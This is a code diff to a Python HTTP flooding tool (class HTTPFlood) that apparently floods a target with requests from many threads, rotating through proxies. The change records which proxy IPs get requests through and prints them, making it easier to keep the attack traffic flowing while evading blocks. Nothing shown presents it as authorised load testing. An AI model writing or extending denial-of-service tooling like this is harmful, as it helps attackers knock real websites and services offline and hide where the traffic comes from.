@@ -25,6 +25,7 @@ class Config:
     proxy_index = 0
     proxy_lock = threading.Lock()
     bad_proxies = set()
+    working_proxies = set()
     debug = False
     
     stats = {
@@ -284,6 +285,14 @@ def display_stats():
     if config.stats['status_codes']:
         codes = ', '.join([f"{k}:{v}" for k, v in sorted(config.stats['status_codes'].items())])
         print(f"[STATS] Status Codes: {codes}")
+    
+    if config.proxies and config.working_proxies:
+        working_count = len(config.working_proxies)
+        working_ips = ', '.join(sorted(list(config.working_proxies))[:10])
+        if len(config.working_proxies) > 10:
+            working_ips += f" ... (+{len(config.working_proxies) - 10} more)"
+        print(f"[STATS] Working Proxies: {working_count} | IPs: {working_ips}")
+    
     print(f"{'='*70}")
 
 class HTTPFlood:
@@ -313,6 +322,7 @@ class HTTPFlood:
         if config.proxies:
             print(f"[*] Loaded {len(config.proxies)} proxies for rotation across all threads")
             self.use_proxy_rotation = True
+            config.working_proxies.clear()
         else:
             self.use_proxy_rotation = False
         
@@ -337,8 +347,10 @@ class HTTPFlood:
         warnings.filterwarnings('ignore', message='Unverified HTTPS request')
         
         current_proxy_index = thread_id % len(config.proxies) if config.proxies else 0
+        current_proxy_ip = None
         if self.use_proxy_rotation:
             proxy = config.proxies[current_proxy_index]
+            current_proxy_ip = proxy.replace('http://', '').replace('https://', '').split(':')[0]
             session.proxies = {'http': proxy, 'https': proxy}
         
         end_time = time.time() + self.duration
@@ -378,6 +390,10 @@ class HTTPFlood:
                     bytes_received=len(response.content)
                 )
                 
+                if current_proxy_ip:
+                    with config.stats_lock:
+                        config.working_proxies.add(current_proxy_ip)
+                
                 consecutive_fails = 0
                 local_count += 1
                 
@@ -396,6 +412,7 @@ class HTTPFlood:
                     try:
                         current_proxy_index = (current_proxy_index + 1) % len(config.proxies)
                         proxy = config.proxies[current_proxy_index]
+                        current_proxy_ip = proxy.replace('http://', '').replace('https://', '').split(':')[0]
                         session.proxies = {'http': proxy, 'https': proxy}
                         consecutive_fails = 0
                     except:
